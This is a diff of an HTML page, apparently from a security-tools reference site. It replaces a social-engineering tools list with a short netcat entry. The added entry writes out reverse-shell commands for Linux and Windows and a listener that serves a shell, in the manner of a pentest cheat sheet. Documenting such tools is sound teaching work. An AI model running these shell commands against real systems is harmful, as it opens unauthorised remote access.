@@ -27,18 +27,25 @@
 
 <div class="row">
         <div class="leftcolumn">
-        <div class="card">
-            <h2>Social Engineering Tools</h2>
-            <ul>
-                <li><a class="link" href="SET.html">SET</a></li>
-                <li><a class="link" href="BeEF.html">BeEF</a></li>
-            </ul>
-            <div class="articlenav">
-                <p><a class="link" href="Wireless.html" style="float: left;"><- Wireless</a></p>
-                <p><a class="link" href="Web_Proxies.html" style="float: right;">Web Proxies -></a></p>
-              </div>
-            <p><a class="link" href="/index.html">Home</a></p>
-        </div>
+            <div class="card">
+                <h2>NETCAT</h2>
+                <p>netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. The command is designed to be a dependable back-end that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and investigation tool, since it can produce almost any kind of connection its user could need and has a number of built-in capabilities.</p>
+                <p>Its list of features includes port scanning, transferring files, and port listening, and it can be used as a backdoor.</p>
+                <p>Reverse shell on Linux:</p>
+                <p><code>nc [IP of remote system] [port] -e /bin/sh</code></p>
+                <p>Reverse shell on Windows:</p>
+                <p><code> nc [IP of remote system] [port] -e cmd.exe</code></p>
+                <p>Set up a listener:</p>
+                <p><code>nc -l -p [port]</code></p>
+                <p>Set up a listener with a shell:</p>
+                <p><code> nc -l -p [port] -e /bin/sh</code></p>
+
+                <div class="articlenav">
+                    <a class="link" href="NCAT.html" style="float: left;"><- NCAT</a>
+                    <a class="link" href="Proxychains.html" style="float: right;">Proxychains -></a>
+                  </div>
+                <p><a class="link" href="/index.html">Home</a></p>
+            </div>
         </div>
         
         <div id="rightsidebar">
@@ -47,19 +54,10 @@
           
           <script>
           $(function(){
-            // $("#rightsidebar").load("/templates/sideright.html");
-            $("#rightsidebar").load("/templates/ToolSubNav.html");
+            $("#rightsidebar").load("/templates/RemoteAccessNav.html");
           });
           </script>
-
-          <!-- <div id="SocialNav">
-        </div>
-        <script>
-          $(function(){
-            $("#SocialNav").load("/templates/SocialNav.html");
-          });
-          </script>
-       </div> -->
+       </div>
 
 
     </div>
